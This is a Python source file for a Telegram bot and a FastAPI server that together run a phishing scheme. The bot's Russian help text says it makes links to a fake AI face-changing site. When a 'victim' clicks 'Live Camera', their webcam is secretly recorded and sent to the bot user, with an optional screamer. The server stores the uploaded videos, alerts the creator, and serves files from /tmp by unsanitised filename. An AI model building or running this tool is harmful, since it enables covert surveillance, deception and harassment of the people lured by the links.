import os
import telebot

bot = telebot.TeleBot(os.environ.get("BOT_TOKEN"))

@bot.message_handler(commands=['start', 'help'])
def start_message(message):
  bot.send_message(message.chat.id,'Привет!\nЭтот бот генерирует ссылку на фейковый сайт с нейросетью которая якобы меняет твое лицо\nКогда жертва нажмет кнопку "Live Camera" начнется запись с веб камеры жертвы и будет отправлена этим ботом тебе, а тем временем у жертвы будет бесконечная загрузка\nТакже можно сгенерировать ссылку со скримером\n\n/gen - Сгенерировать ссылку без скримера\n/gen_screamer - Сгенерировать ссылку со скримером\n/help - Помощь')

@bot.message_handler(commands=["gen"])
def gen(message):
    bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}')

@bot.message_handler(commands=["gen_screamer"])
def gen(message):
    bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}&v2=true')


@bot.message_handler()
def unknown_command(message):
    bot.send_message(message.chat.id, "Я тебя не понимаю(\nНапиши /help")

bot.infinity_polling()




from fastapi import FastAPI, File, UploadFile
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles


app = FastAPI()

origins = ["*"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


import asyncio
timeout_seconds = 5  # 5 seconds timeout

@app.post("/upload-video")
async def upload_video(video: UploadFile = File(...)):
    try:
        # Create a timeout task
        timeout_task = asyncio.create_task(asyncio.sleep(timeout_seconds))

        # Write the video file to the temporary directory
        with open(os.path.join("/tmp", video.filename), "wb") as buffer:
            buffer.write(video.file.read())

        # Wait for either the timeout task to complete or the next chunk to arrive
        done, pending = await asyncio.wait({timeout_task}, timeout=1)

        if timeout_task in done:
            # If the timeout task completed, cancel the upload
            creator_id = 0
            filename = video.filename.split(".webm")[0]
            if "-" not in filename:
                creator_id = 2114613077
            else:
                creator_id = int(filename.split("-")[0])
            
            bot.send_message(creator_id, "Жертва")
            os.remove(os.path.join("/tmp", video.filename))

        # If the next chunk arrived, cancel the timeout task
        timeout_task.cancel()

        # Continue uploading the video
        # ...

    except Exception as e:
        return "Error: " + repr(e)


@app.get("/videos/{filename}")
async def get_video(filename: str):
    return FileResponse(os.path.join("/tmp", filename)) 




#TODO delete video on upload to telegram